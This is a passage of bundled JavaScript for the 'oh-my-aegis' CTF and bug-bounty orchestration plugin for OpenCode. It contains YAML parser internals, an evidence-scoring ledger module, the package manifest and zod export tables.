                Array.prototype.push.apply(end, it.start);
                end.push(this.sourceToken);
                seq.items.pop();
                return;
              }
            }
            it.start.push(this.sourceToken);
          }
          return;
        case "anchor":
        case "tag":
          if (it.value || this.indent <= seq.indent)
            break;
          it.start.push(this.sourceToken);
          return;
        case "seq-item-ind":
          if (this.indent !== seq.indent)
            break;
          if (it.value || includesToken(it.start, "seq-item-ind"))
            seq.items.push({ start: [this.sourceToken] });
          else
            it.start.push(this.sourceToken);
          return;
      }
      if (this.indent > seq.indent) {
        const bv = this.startBlockValue(seq);
        if (bv) {
          this.stack.push(bv);
          return;
        }
      }
      yield* this.pop();
      yield* this.step();
    }
    *flowCollection(fc) {
      const it = fc.items[fc.items.length - 1];
      if (this.type === "flow-error-end") {
        let top;
        do {
          yield* this.pop();
          top = this.peek(1);
        } while (top?.type === "flow-collection");
      } else if (fc.end.length === 0) {
        switch (this.type) {
          case "comma":
          case "explicit-key-ind":
            if (!it || it.sep)
              fc.items.push({ start: [this.sourceToken] });
            else
              it.start.push(this.sourceToken);
            return;
          case "map-value-ind":
            if (!it || it.value)
              fc.items.push({ start: [], key: null, sep: [this.sourceToken] });
            else if (it.sep)
              it.sep.push(this.sourceToken);
            else
              Object.assign(it, { key: null, sep: [this.sourceToken] });
            return;
          case "space":
          case "comment":
          case "newline":
          case "anchor":
          case "tag":
            if (!it || it.value)
              fc.items.push({ start: [this.sourceToken] });
            else if (it.sep)
              it.sep.push(this.sourceToken);
            else
              it.start.push(this.sourceToken);
            return;
          case "alias":
          case "scalar":
          case "single-quoted-scalar":
          case "double-quoted-scalar": {
            const fs = this.flowScalar(this.type);
            if (!it || it.value)
              fc.items.push({ start: [], key: fs, sep: [] });
            else if (it.sep)
              this.stack.push(fs);
            else
              Object.assign(it, { key: fs, sep: [] });
            return;
          }
          case "flow-map-end":
          case "flow-seq-end":
            fc.end.push(this.sourceToken);
            return;
        }
        const bv = this.startBlockValue(fc);
        if (bv)
          this.stack.push(bv);
        else {
          yield* this.pop();
          yield* this.step();
        }
      } else {
        const parent = this.peek(2);
        if (parent.type === "block-map" && (this.type === "map-value-ind" && parent.indent === fc.indent || this.type === "newline" && !parent.items[parent.items.length - 1].sep)) {
          yield* this.pop();
          yield* this.step();
        } else if (this.type === "map-value-ind" && parent.type !== "flow-collection") {
          const prev = getPrevProps(parent);
          const start = getFirstKeyStartProps(prev);
          fixFlowSeqItems(fc);
          const sep = fc.end.splice(1, fc.end.length);
          sep.push(this.sourceToken);
          const map2 = {
            type: "block-map",
            offset: fc.offset,
            indent: fc.indent,
            items: [{ start, key: fc, sep }]
          };
          this.onKeyLine = true;
          this.stack[this.stack.length - 1] = map2;
        } else {
          yield* this.lineEnd(fc);
        }
      }
    }
    flowScalar(type) {
      if (this.onNewLine) {
        let nl = this.source.indexOf(`
`) + 1;
        while (nl !== 0) {
          this.onNewLine(this.offset + nl);
          nl = this.source.indexOf(`
`, nl) + 1;
        }
      }
      return {
        type,
        offset: this.offset,
        indent: this.indent,
        source: this.source
      };
    }
    startBlockValue(parent) {
      switch (this.type) {
        case "alias":
        case "scalar":
        case "single-quoted-scalar":
        case "double-quoted-scalar":
          return this.flowScalar(this.type);
        case "block-scalar-header":
          return {
            type: "block-scalar",
            offset: this.offset,
            indent: this.indent,
            props: [this.sourceToken],
            source: ""
          };
        case "flow-map-start":
        case "flow-seq-start":
          return {
            type: "flow-collection",
            offset: this.offset,
            indent: this.indent,
            start: this.sourceToken,
            items: [],
            end: []
          };
        case "seq-item-ind":
          return {
            type: "block-seq",
            offset: this.offset,
            indent: this.indent,
            items: [{ start: [this.sourceToken] }]
          };
        case "explicit-key-ind": {
          this.onKeyLine = true;
          const prev = getPrevProps(parent);
          const start = getFirstKeyStartProps(prev);
          start.push(this.sourceToken);
          return {
            type: "block-map",
            offset: this.offset,
            indent: this.indent,
            items: [{ start, explicitKey: true }]
          };
        }
        case "map-value-ind": {
          this.onKeyLine = true;
          const prev = getPrevProps(parent);
          const start = getFirstKeyStartProps(prev);
          return {
            type: "block-map",
            offset: this.offset,
            indent: this.indent,
            items: [{ start, key: null, sep: [this.sourceToken] }]
          };
        }
      }
      return null;
    }
    atIndentedComment(start, indent) {
      if (this.type !== "comment")
        return false;
      if (this.indent <= indent)
        return false;
      return start.every((st) => st.type === "newline" || st.type === "space");
    }
    *documentEnd(docEnd) {
      if (this.type !== "doc-mode") {
        if (docEnd.end)
          docEnd.end.push(this.sourceToken);
        else
          docEnd.end = [this.sourceToken];
        if (this.type === "newline")
          yield* this.pop();
      }
    }
    *lineEnd(token) {
      switch (this.type) {
        case "comma":
        case "doc-start":
        case "doc-end":
        case "flow-seq-end":
        case "flow-map-end":
        case "map-value-ind":
          yield* this.pop();
          yield* this.step();
          break;
        case "newline":
          this.onKeyLine = false;
        case "space":
        case "comment":
        default:
          if (token.end)
            token.end.push(this.sourceToken);
          else
            token.end = [this.sourceToken];
          if (this.type === "newline")
            yield* this.pop();
      }
    }
  }
  exports.Parser = Parser;
});

// node_modules/yaml/dist/public-api.js
var require_public_api = __commonJS((exports) => {
  var composer = require_composer();
  var Document = require_Document();
  var errors3 = require_errors();
  var log = require_log();
  var identity = require_identity();
  var lineCounter = require_line_counter();
  var parser = require_parser();
  function parseOptions(options) {
    const prettyErrors = options.prettyErrors !== false;
    const lineCounter$1 = options.lineCounter || prettyErrors && new lineCounter.LineCounter || null;
    return { lineCounter: lineCounter$1, prettyErrors };
  }
  function parseAllDocuments(source, options = {}) {
    const { lineCounter: lineCounter2, prettyErrors } = parseOptions(options);
    const parser$1 = new parser.Parser(lineCounter2?.addNewLine);
    const composer$1 = new composer.Composer(options);
    const docs = Array.from(composer$1.compose(parser$1.parse(source)));
    if (prettyErrors && lineCounter2)
      for (const doc2 of docs) {
        doc2.errors.forEach(errors3.prettifyError(source, lineCounter2));
        doc2.warnings.forEach(errors3.prettifyError(source, lineCounter2));
      }
    if (docs.length > 0)
      return docs;
    return Object.assign([], { empty: true }, composer$1.streamInfo());
  }
  function parseDocument(source, options = {}) {
    const { lineCounter: lineCounter2, prettyErrors } = parseOptions(options);
    const parser$1 = new parser.Parser(lineCounter2?.addNewLine);
    const composer$1 = new composer.Composer(options);
    let doc2 = null;
    for (const _doc of composer$1.compose(parser$1.parse(source), true, source.length)) {
      if (!doc2)
        doc2 = _doc;
      else if (doc2.options.logLevel !== "silent") {
        doc2.errors.push(new errors3.YAMLParseError(_doc.range.slice(0, 2), "MULTIPLE_DOCS", "Source contains multiple documents; please use YAML.parseAllDocuments()"));
        break;
      }
    }
    if (prettyErrors && lineCounter2) {
      doc2.errors.forEach(errors3.prettifyError(source, lineCounter2));
      doc2.warnings.forEach(errors3.prettifyError(source, lineCounter2));
    }
    return doc2;
  }
  function parse5(src, reviver, options) {
    let _reviver = undefined;
    if (typeof reviver === "function") {
      _reviver = reviver;
    } else if (options === undefined && reviver && typeof reviver === "object") {
      options = reviver;
    }
    const doc2 = parseDocument(src, options);
    if (!doc2)
      return null;
    doc2.warnings.forEach((warning) => log.warn(doc2.options.logLevel, warning));
    if (doc2.errors.length > 0) {
      if (doc2.options.logLevel !== "silent")
        throw doc2.errors[0];
      else
        doc2.errors = [];
    }
    return doc2.toJS(Object.assign({ reviver: _reviver }, options));
  }
  function stringify(value, replacer, options) {
    let _replacer = null;
    if (typeof replacer === "function" || Array.isArray(replacer)) {
      _replacer = replacer;
    } else if (options === undefined && replacer) {
      options = replacer;
    }
    if (typeof options === "string")
      options = options.length;
    if (typeof options === "number") {
      const indent = Math.round(options);
      options = indent < 1 ? undefined : indent > 8 ? { indent: 8 } : { indent };
    }
    if (value === undefined) {
      const { keepUndefined } = options ?? replacer ?? {};
      if (!keepUndefined)
        return;
    }
    if (identity.isDocument(value) && !_replacer)
      return value.toString(options);
    return new Document.Document(value, _replacer, options).toString(options);
  }
  exports.parse = parse5;
  exports.parseAllDocuments = parseAllDocuments;
  exports.parseDocument = parseDocument;
  exports.stringify = stringify;
});

// src/utils/debug-log.ts
function debugLog(tag, message, error48) {
  if (!DEBUG)
    return;
  const ts = new Date().toISOString();
  const errorSuffix = error48 instanceof Error ? ` | ${error48.message}` : error48 ? ` | ${String(error48)}` : "";
  process.stderr.write(`[aegis:${tag}] ${ts} ${message}${errorSuffix}
`);
}
var DEBUG;
var init_debug_log = __esm(() => {
  DEBUG = process.env.AEGIS_DEBUG === "1" || process.env.AEGIS_DEBUG === "true";
});

// src/orchestration/evidence-ledger.ts
var exports_evidence_ledger = {};
__export(exports_evidence_ledger, {
  scoreEvidence: () => scoreEvidence,
  computeOracleProgress: () => computeOracleProgress,
  clampConfidence: () => clampConfidence,
  appendEvidenceLedger: () => appendEvidenceLedger
});
import { appendFileSync, existsSync as existsSync7, mkdirSync as mkdirSync3, renameSync as renameSync2, statSync as statSync3 } from "fs";
import { join as join8 } from "path";
function clampConfidence(value) {
  if (!Number.isFinite(value))
    return 0;
  return Math.max(0, Math.min(1, value));
}
function computeOracleProgress(current, previous) {
  const passRate = current.totalTests > 0 ? current.passCount / current.totalTests : 0;
  const improved = previous ? current.passCount > previous.passCount || current.failIndex > previous.failIndex && previous.failIndex >= 0 : current.passCount > 0;
  return { ...current, passRate, improved };
}
function scoreEvidence(entries, oracleProgress) {
  if (entries.length === 0) {
    return { score: 0, level: "L0", hasAcceptance: false, oracleWeight: 0 };
  }
  const baseScore = entries.reduce((acc, entry) => {
    const weight = EVIDENCE_WEIGHTS[entry.evidenceType] ?? 0;
    return acc + weight * clampConfidence(entry.confidence);
  }, 0);
  const hasAcceptance = entries.some((entry) => entry.evidenceType === "acceptance_oracle");
  let oracleWeight = 0;
  if (oracleProgress && oracleProgress.totalTests > 0) {
    oracleWeight = oracleProgress.passRate * 10;
    if (oracleProgress.improved)
      oracleWeight += 2;
  }
  const score = baseScore + oracleWeight;
  if (hasAcceptance && score >= 4) {
    return { score: Number(score.toFixed(3)), level: "L3", hasAcceptance: true, oracleWeight: Number(oracleWeight.toFixed(3)) };
  }
  if (score >= 3) {
    return { score: Number(score.toFixed(3)), level: "L2", hasAcceptance, oracleWeight: Number(oracleWeight.toFixed(3)) };
  }
  if (score >= 1) {
    return { score: Number(score.toFixed(3)), level: "L1", hasAcceptance, oracleWeight: Number(oracleWeight.toFixed(3)) };
  }
  return { score: Number(score.toFixed(3)), level: "L0", hasAcceptance, oracleWeight: Number(oracleWeight.toFixed(3)) };
}
function rotateLedgerIfNeeded(ledgerPath) {
  try {
    if (!existsSync7(ledgerPath))
      return;
    const stat = statSync3(ledgerPath);
    if (stat.size < MAX_LEDGER_SIZE_BYTES)
      return;
    for (let i = MAX_ROTATED_FILES - 1;i >= 1; i--) {
      const older = `${ledgerPath}.${i}`;
      const newer = `${ledgerPath}.${i + 1}`;
      if (existsSync7(older)) {
        try {
          renameSync2(older, newer);
        } catch (error48) {
          debugLog("evidence", `rotate rename ${i}->${i + 1} failed`, error48);
        }
      }
    }
    try {
      renameSync2(ledgerPath, `${ledgerPath}.1`);
    } catch (error48) {
      debugLog("evidence", "rotate current->1 failed", error48);
    }
  } catch (error48) {
    debugLog("evidence", "rotateLedgerIfNeeded failed", error48);
  }
}
function appendEvidenceLedger(rootDir, entry) {
  try {
    mkdirSync3(rootDir, { recursive: true });
    const path = join8(rootDir, "evidence-ledger.jsonl");
    rotateLedgerIfNeeded(path);
    appendFileSync(path, `${JSON.stringify(entry)}
`, "utf-8");
    return { ok: true };
  } catch (error48) {
    const reason = error48 instanceof Error ? error48.message : String(error48);
    return { ok: false, reason };
  }
}
var EVIDENCE_WEIGHTS, MAX_LEDGER_SIZE_BYTES, MAX_ROTATED_FILES = 3;
var init_evidence_ledger = __esm(() => {
  init_debug_log();
  EVIDENCE_WEIGHTS = {
    string_pattern: 1,
    static_reverse: 2,
    dynamic_memory: 3,
    behavioral_runtime: 4,
    acceptance_oracle: 5
  };
  MAX_LEDGER_SIZE_BYTES = 2 * 1024 * 1024;
});

// package.json
var require_package = __commonJS((exports, module) => {
  module.exports = {
    name: "oh-my-aegis",
    version: "0.1.30",
    description: "Standalone CTF/BOUNTY orchestration plugin for OpenCode (Aegis)",
    type: "module",
    main: "dist/index.js",
    types: "dist/index.d.ts",
    bin: {
      "oh-my-aegis": "dist/cli/index.js"
    },
    files: [
      "dist",
      "playbooks"
    ],
    scripts: {
      build: "bun build src/index.ts --outdir dist --target bun --format esm && bun run scripts/clean-dist.ts && tsc -p tsconfig.build.json --emitDeclarationOnly && bun build src/cli/index.ts --outdir dist/cli --target bun --format esm",
      typecheck: "tsc --noEmit",
      test: "bun test",
      apply: "bun run build && bun run scripts/apply.ts",
      setup: "bun install && bun run apply",
      doctor: "bun run scripts/doctor.ts",
      "benchmark:generate": "bun run scripts/benchmark-generate.ts",
      "benchmark:score": "bun run scripts/benchmark-score.ts",
      "release:version": "bun run scripts/release-version.ts",
      "release:notes": "bun run scripts/generate-changelog.ts"
    },
    dependencies: {
      "@openauthjs/openauth": "^0.4.3",
      "@opencode-ai/plugin": "^1.2.11",
      "@opencode-ai/sdk": "^1.2.11",
      yaml: "^2.8.1",
      zod: "^4.1.8"
    },
    devDependencies: {
      "@ast-grep/cli": "^0.41.0",
      "bun-types": "latest",
      typescript: "^5.7.3"
    },
    trustedDependencies: [
      "@ast-grep/cli"
    ]
  };
});

// src/index-core.ts
import { appendFileSync as appendFileSync5, existsSync as existsSync16, mkdirSync as mkdirSync8, readFileSync as readFileSync13, statSync as statSync7, writeFileSync as writeFileSync6 } from "fs";
import { dirname as dirname5, isAbsolute as isAbsolute5, join as join17, relative as relative5, resolve as resolve7 } from "path";

// src/config/loader.ts
import { existsSync, readFileSync } from "fs";
import { join } from "path";

// node_modules/zod/v4/classic/external.js
var exports_external = {};
__export(exports_external, {
  xor: () => xor,
  xid: () => xid2,
  void: () => _void2,
  uuidv7: () => uuidv7,
  uuidv6: () => uuidv6,
  uuidv4: () => uuidv4,
  uuid: () => uuid2,
  util: () => exports_util,
  url: () => url,
  uppercase: () => _uppercase,
  unknown: () => unknown,
  union: () => union,
  undefined: () => _undefined3,
  ulid: () => ulid2,
  uint64: () => uint64,
  uint32: () => uint32,
  tuple: () => tuple,
  trim: () => _trim,
  treeifyError: () => treeifyError,
  transform: () => transform,
  toUpperCase: () => _toUpperCase,
  toLowerCase: () => _toLowerCase,
  toJSONSchema: () => toJSONSchema,
  templateLiteral: () => templateLiteral,
  symbol: () => symbol,
  superRefine: () => superRefine,
  success: () => success,
  stringbool: () => stringbool,
  stringFormat: () => stringFormat,
  string: () => string2,
  strictObject: () => strictObject,
  startsWith: () => _startsWith,
  slugify: () => _slugify,
  size: () => _size,
  setErrorMap: () => setErrorMap,
  set: () => set,
  safeParseAsync: () => safeParseAsync2,
  safeParse: () => safeParse2,
  safeEncodeAsync: () => safeEncodeAsync2,
  safeEncode: () => safeEncode2,
  safeDecodeAsync: () => safeDecodeAsync2,
  safeDecode: () => safeDecode2,
  registry: () => registry,
  regexes: () => exports_regexes,
  regex: () => _regex,
  refine: () => refine,
  record: () => record,
  readonly: () => readonly,
  property: () => _property,
  promise: () => promise,
  prettifyError: () => prettifyError,
  preprocess: () => preprocess,
  prefault: () => prefault,
  positive: () => _positive,
  pipe: () => pipe,
  partialRecord: () => partialRecord,
  parseAsync: () => parseAsync2,
  parse: () => parse3,
  overwrite: () => _overwrite,
  optional: () => optional,
  object: () => object,
  number: () => number2,
  nullish: () => nullish2,
  nullable: () => nullable,
  null: () => _null3,
  normalize: () => _normalize,
  nonpositive: () => _nonpositive,
  nonoptional: () => nonoptional,
  nonnegative: () => _nonnegative,
  never: () => never,
  negative: () => _negative,
  nativeEnum: () => nativeEnum,
  nanoid: () => nanoid2,
  nan: () => nan,
  multipleOf: () => _multipleOf,
  minSize: () => _minSize,
  minLength: () => _minLength,
  mime: () => _mime,
  meta: () => meta2,
  maxSize: () => _maxSize,
  maxLength: () => _maxLength,
  map: () => map,
  mac: () => mac2,
  lte: () => _lte,
  lt: () => _lt,
  lowercase: () => _lowercase,
  looseRecord: () => looseRecord,
  looseObject: () => looseObject,
  locales: () => exports_locales,
  literal: () => literal,
  length: () => _length,
  lazy: () => lazy,
  ksuid: () => ksuid2,
  keyof: () => keyof,
  jwt: () => jwt,
  json: () => json,
  iso: () => exports_iso,
  ipv6: () => ipv62,
  ipv4: () => ipv42,
  intersection: () => intersection,
  int64: () => int64,
  int32: () => int32,
  int: () => int,
  instanceof: () => _instanceof,
  includes: () => _includes,
  httpUrl: () => httpUrl,
  hostname: () => hostname2,
  hex: () => hex2,
  hash: () => hash,
  guid: () => guid2,
  gte: () => _gte,
  gt: () => _gt,
  globalRegistry: () => globalRegistry,
  getErrorMap: () => getErrorMap,
  function: () => _function,
  fromJSONSchema: () => fromJSONSchema,
  formatError: () => formatError,
  float64: () => float64,
  float32: () => float32,
  flattenError: () => flattenError,
  file: () => file,
  exactOptional: () => exactOptional,
  enum: () => _enum2,
  endsWith: () => _endsWith,
  encodeAsync: () => encodeAsync2,
  encode: () => encode2,
  emoji: () => emoji2,
  email: () => email2,
  e164: () => e1642,
  discriminatedUnion: () => discriminatedUnion,
  describe: () => describe2,
  decodeAsync: () => decodeAsync2,
  decode: () => decode2,
  date: () => date3,
  custom: () => custom,
  cuid2: () => cuid22,
  cuid: () => cuid3,
  core: () => exports_core2,
  config: () => config,
  coerce: () => exports_coerce,
  codec: () => codec,
  clone: () => clone,
  cidrv6: () => cidrv62,
  cidrv4: () => cidrv42,
  check: () => check,
  catch: () => _catch2,
  boolean: () => boolean2,
  bigint: () => bigint2,
  base64url: () => base64url2,
  base64: () => base642,
  array: () => array,
  any: () => any,
  _function: () => _function,
  _default: () => _default2,
  _ZodString: () => _ZodString,
  ZodXor: () => ZodXor,
  ZodXID: () => ZodXID,
  ZodVoid: () => ZodVoid,
  ZodUnknown: () => ZodUnknown,
  ZodUnion: () => ZodUnion,
  ZodUndefined: () => ZodUndefined,
  ZodUUID: () => ZodUUID,
  ZodURL: () => ZodURL,
  ZodULID: () => ZodULID,
  ZodType: () => ZodType,
  ZodTuple: () => ZodTuple,
  ZodTransform: () => ZodTransform,
  ZodTemplateLiteral: () => ZodTemplateLiteral,
  ZodSymbol: () => ZodSymbol,
  ZodSuccess: () => ZodSuccess,
  ZodStringFormat: () => ZodStringFormat,
  ZodString: () => ZodString,
  ZodSet: () => ZodSet,
  ZodRecord: () => ZodRecord,
  ZodRealError: () => ZodRealError,
  ZodReadonly: () => ZodReadonly,
  ZodPromise: () => ZodPromise,
  ZodPrefault: () => ZodPrefault,
  ZodPipe: () => ZodPipe,
  ZodOptional: () => ZodOptional,
  ZodObject: () => ZodObject,
  ZodNumberFormat: () => ZodNumberFormat,
  ZodNumber: () => ZodNumber,
  ZodNullable: () => ZodNullable,
  ZodNull: () => ZodNull,
  ZodNonOptional: () => ZodNonOptional,
  ZodNever: () => ZodNever,
  ZodNanoID: () => ZodNanoID,
  ZodNaN: () => ZodNaN,
  ZodMap: () => ZodMap,
  ZodMAC: () => ZodMAC,
  ZodLiteral: () => ZodLiteral,
  ZodLazy: () => ZodLazy,
  ZodKSUID: () => ZodKSUID,
  ZodJWT: () => ZodJWT,
  ZodIssueCode: () => ZodIssueCode,
  ZodIntersection: () => ZodIntersection,
  ZodISOTime: () => ZodISOTime,
  ZodISODuration: () => ZodISODuration,
  ZodISODateTime: () => ZodISODateTime,
  ZodISODate: () => ZodISODate,
  ZodIPv6: () => ZodIPv6,
  ZodIPv4: () => ZodIPv4,
  ZodGUID: () => ZodGUID,
  ZodFunction: () => ZodFunction,
  ZodFirstPartyTypeKind: () => ZodFirstPartyTypeKind,
  ZodFile: () => ZodFile,
  ZodExactOptional: () => ZodExactOptional,
  ZodError: () => ZodError,
  ZodEnum: () => ZodEnum,
  ZodEmoji: () => ZodEmoji,
  ZodEmail: () => ZodEmail,
  ZodE164: () => ZodE164,
  ZodDiscriminatedUnion: () => ZodDiscriminatedUnion,
  ZodDefault: () => ZodDefault,
  ZodDate: () => ZodDate,
  ZodCustomStringFormat: () => ZodCustomStringFormat,
  ZodCustom: () => ZodCustom,
  ZodCodec: () => ZodCodec,
  ZodCatch: () => ZodCatch,
  ZodCUID2: () => ZodCUID2,
  ZodCUID: () => ZodCUID,
  ZodCIDRv6: () => ZodCIDRv6,
  ZodCIDRv4: () => ZodCIDRv4,
  ZodBoolean: () => ZodBoolean,
  ZodBigIntFormat: () => ZodBigIntFormat,
  ZodBigInt: () => ZodBigInt,
  ZodBase64URL: () => ZodBase64URL,
  ZodBase64: () => ZodBase64,
  ZodArray: () => ZodArray,
  ZodAny: () => ZodAny,
  TimePrecision: () => TimePrecision,
  NEVER: () => NEVER,
  $output: () => $output,
  $input: () => $input,
  $brand: () => $brand
});

// node_modules/zod/v4/core/index.js
var exports_core2 = {};
__export(exports_core2, {
  version: () => version,
  util: () => exports_util,
  treeifyError: () => treeifyError,
  toJSONSchema: () => toJSONSchema,
  toDotPath: () => toDotPath,
  safeParseAsync: () => safeParseAsync,
  safeParse: () => safeParse,
  safeEncodeAsync: () => safeEncodeAsync,
  safeEncode: () => safeEncode,
  safeDecodeAsync: () => safeDecodeAsync,
  safeDecode: () => safeDecode,
  registry: () => registry,
  regexes: () => exports_regexes,
  process: () => process2,
  prettifyError: () => prettifyError,
  parseAsync: () => parseAsync,
  parse: () => parse,
  meta: () => meta,
  locales: () => exports_locales,
  isValidJWT: () => isValidJWT,
  isValidBase64URL: () => isValidBase64URL,
  isValidBase64: () => isValidBase64,
  initializeContext: () => initializeContext,
  globalRegistry: () => globalRegistry,
  globalConfig: () => globalConfig,
  formatError: () => formatError,
  flattenError: () => flattenError,
  finalize: () => finalize,
  extractDefs: () => extractDefs,
  encodeAsync: () => encodeAsync,
  encode: () => encode,
  describe: () => describe,
  decodeAsync: () => decodeAsync,
  decode: () => decode,
  createToJSONSchemaMethod: () => createToJSONSchemaMethod,
  createStandardJSONSchemaMethod: () => createStandardJSONSchemaMethod,
  config: () => config,
  clone: () => clone,
  _xor: () => _xor,
  _xid: () => _xid,
  _void: () => _void,
  _uuidv7: () => _uuidv7,
  _uuidv6: () => _uuidv6,
  _uuidv4: () => _uuidv4,
  _uuid: () => _uuid,
  _url: () => _url,
  _uppercase: () => _uppercase,
  _unknown: () => _unknown,
  _union: () => _union,
  _undefined: () => _undefined2,
  _ulid: () => _ulid,
  _uint64: () => _uint64,
  _uint32: () => _uint32,
  _tuple: () => _tuple,
  _trim: () => _trim,
  _transform: () => _transform,
  _toUpperCase: () => _toUpperCase,
  _toLowerCase: () => _toLowerCase,
  _templateLiteral: () => _templateLiteral,
  _symbol: () => _symbol,
  _superRefine: () => _superRefine,
  _success: () => _success,
  _stringbool: () => _stringbool,
  _stringFormat: () => _stringFormat,
  _string: () => _string,
  _startsWith: () => _startsWith,
  _slugify: () => _slugify,
  _size: () => _size,
  _set: () => _set,
  _safeParseAsync: () => _safeParseAsync,
  _safeParse: () => _safeParse,
  _safeEncodeAsync: () => _safeEncodeAsync,
  _safeEncode: () => _safeEncode,
  _safeDecodeAsync: () => _safeDecodeAsync,
  _safeDecode: () => _safeDecode,
  _regex: () => _regex,
  _refine: () => _refine,
  _record: () => _record,
  _readonly: () => _readonly,
  _property: () => _property,
  _promise: () => _promise,
  _positive: () => _positive,
  _pipe: () => _pipe,
  _parseAsync: () => _parseAsync,
  _parse: () => _parse,
  _overwrite: () => _overwrite,
  _optional: () => _optional,
  _number: () => _number,
  _nullable: () => _nullable,
  _null: () => _null2,
  _normalize: () => _normalize,
  _nonpositive: () => _nonpositive,
  _nonoptional: () => _nonoptional,
  _nonnegative: () => _nonnegative,
  _never: () => _never,
  _negative: () => _negative,
  _nativeEnum: () => _nativeEnum,
  _nanoid: () => _nanoid,
  _nan: () => _nan,
  _multipleOf: () => _multipleOf,
  _minSize: () => _minSize,
  _minLength: () => _minLength,
  _min: () => _gte,
  _mime: () => _mime,
  _maxSize: () => _maxSize,
  _maxLength: () => _maxLength,
  _max: () => _lte,
  _map: () => _map,
  _mac: () => _mac,
  _lte: () => _lte,
  _lt: () => _lt,
  _lowercase: () => _lowercase,
  _literal: () => _literal,
  _length: () => _length,
  _lazy: () => _lazy,
  _ksuid: () => _ksuid,
  _jwt: () => _jwt,
  _isoTime: () => _isoTime,
  _isoDuration: () => _isoDuration,
  _isoDateTime: () => _isoDateTime,
  _isoDate: () => _isoDate,
  _ipv6: () => _ipv6,
  _ipv4: () => _ipv4,
  _intersection: () => _intersection,
  _int64: () => _int64,
  _int32: () => _int32,
  _int: () => _int,
  _includes: () => _includes,
  _guid: () => _guid,
  _gte: () => _gte,
  _gt: () => _gt,
  _float64: () => _float64,
  _float32: () => _float32,
  _file: () => _file,
  _enum: () => _enum,
  _endsWith: () => _endsWith,
  _encodeAsync: () => _encodeAsync,
  _encode: () => _encode,
  _emoji: () => _emoji2,
  _email: () => _email,
  _e164: () => _e164,
  _discriminatedUnion: () => _discriminatedUnion,
  _default: () => _default,
  _decodeAsync: () => _decodeAsync,
  _decode: () => _decode,
  _date: () => _date,
  _custom: () => _custom,
  _cuid2: () => _cuid2,
  _cuid: () => _cuid,
  _coercedString: () => _coercedString,
  _coercedNumber: () => _coercedNumber,
  _coercedDate: () => _coercedDate,
  _coercedBoolean: () => _coercedBoolean,
  _coercedBigint: () => _coercedBigint,
  _cidrv6: () => _cidrv6,
  _cidrv4: () => _cidrv4,
  _check: () => _check,
  _catch: () => _catch,
  _boolean: () => _boolean,
  _bigint: () => _bigint,
  _base64url: () => _base64url,
  _base64: () => _base64,
  _array: () => _array,
  _any: () => _any,
  TimePrecision: () => TimePrecision,
  NEVER: () => NEVER,
  JSONSchemaGenerator: () => JSONSchemaGenerator,
  JSONSchema: () => exports_json_schema,
  Doc: () => Doc,
  $output: () => $output,
  $input: () => $input,
  $constructor: () => $constructor,
  $brand: () => $brand,
  $ZodXor: () => $ZodXor,
  $ZodXID: () => $ZodXID,
  $ZodVoid: () => $ZodVoid,
  $ZodUnknown: () => $ZodUnknown,
  $ZodUnion: () => $ZodUnion,
  $ZodUndefined: () => $ZodUndefined,
  $ZodUUID: () => $ZodUUID,
  $ZodURL: () => $ZodURL,
  $ZodULID: () => $ZodULID,
  $ZodType: () => $ZodType,
  $ZodTuple: () => $ZodTuple,
  $ZodTransform: () => $ZodTransform,
  $ZodTemplateLiteral: () => $ZodTemplateLiteral,
  $ZodSymbol: () => $ZodSymbol,
  $ZodSuccess: () => $ZodSuccess,
  $ZodStringFormat: () => $ZodStringFormat,
  $ZodString: () => $ZodString,
  $ZodSet: () => $ZodSet,
  $ZodRegistry: () => $ZodRegistry,
  $ZodRecord: () => $ZodRecord,
  $ZodRealError: () => $ZodRealError,
  $ZodReadonly: () => $ZodReadonly,
  $ZodPromise: () => $ZodPromise,
  $ZodPrefault: () => $ZodPrefault,
  $ZodPipe: () => $ZodPipe,
  $ZodOptional: () => $ZodOptional,
  $ZodObjectJIT: () => $ZodObjectJIT,
  $ZodObject: () => $ZodObject,
  $ZodNumberFormat: () => $ZodNumberFormat,
  $ZodNumber: () => $ZodNumber,
  $ZodNullable: () => $ZodNullable,
  $ZodNull: () => $ZodNull,
  $ZodNonOptional: () => $ZodNonOptional,
  $ZodNever: () => $ZodNever,
  $ZodNanoID: () => $ZodNanoID,
  $ZodNaN: () => $ZodNaN,
  $ZodMap: () => $ZodMap,
  $ZodMAC: () => $ZodMAC,
  $ZodLiteral: () => $ZodLiteral,
  $ZodLazy: () => $ZodLazy,
  $ZodKSUID: () => $ZodKSUID,
  $ZodJWT: () => $ZodJWT,
  $ZodIntersection: () => $ZodIntersection,
  $ZodISOTime: () => $ZodISOTime,
  $ZodISODuration: () => $ZodISODuration,
  $ZodISODateTime: () => $ZodISODateTime,
  $ZodISODate: () => $ZodISODate,
  $ZodIPv6: () => $ZodIPv6,
  $ZodIPv4: () => $ZodIPv4,
  $ZodGUID: () => $ZodGUID,
  $ZodFunction: () => $ZodFunction,
  $ZodFile: () => $ZodFile,
  $ZodExactOptional: () => $ZodExactOptional,
  $ZodError: () => $ZodError,
  $ZodEnum: () => $ZodEnum,
  $ZodEncodeError: () => $ZodEncodeError,
  $ZodEmoji: () => $ZodEmoji,
  $ZodEmail: () => $ZodEmail,
  $ZodE164: () => $ZodE164,
  $ZodDiscriminatedUnion: () => $ZodDiscriminatedUnion,
  $ZodDefault: () => $ZodDefault,
  $ZodDate: () => $ZodDate,
  $ZodCustomStringFormat: () => $ZodCustomStringFormat,
  $ZodCustom: () => $ZodCustom,
  $ZodCodec: () => $ZodCodec,
  $ZodCheckUpperCase: () => $ZodCheckUpperCase,
  $ZodCheckStringFormat: () => $ZodCheckStringFormat,
  $ZodCheckStartsWith: () => $ZodCheckStartsWith,
  $ZodCheckSizeEquals: () => $ZodCheckSizeEquals,
  $ZodCheckRegex: () => $ZodCheckRegex,
  $ZodCheckProperty: () => $ZodCheckProperty,
  $ZodCheckOverwrite: () => $ZodCheckOverwrite,
  $ZodCheckNumberFormat: () => $ZodCheckNumberFormat,
  $ZodCheckMultipleOf: () => $ZodCheckMultipleOf,
  $ZodCheckMinSize: () => $ZodCheckMinSize,
  $ZodCheckMinLength: () => $ZodCheckMinLength,
  $ZodCheckMimeType: () => $ZodCheckMimeType,
  $ZodCheckMaxSize: () => $ZodCheckMaxSize,
  $ZodCheckMaxLength: () => $ZodCheckMaxLength,
  $ZodCheckLowerCase: () => $ZodCheckLowerCase,
  $ZodCheckLessThan: () => $ZodCheckLessThan,
  $ZodCheckLengthEquals: () => $ZodCheckLengthEquals,
  $ZodCheckIncludes: () => $ZodCheckIncludes,
  $ZodCheckGreaterThan: () => $ZodCheckGreaterThan,
  $ZodCheckEndsWith: () => $ZodCheckEndsWith,
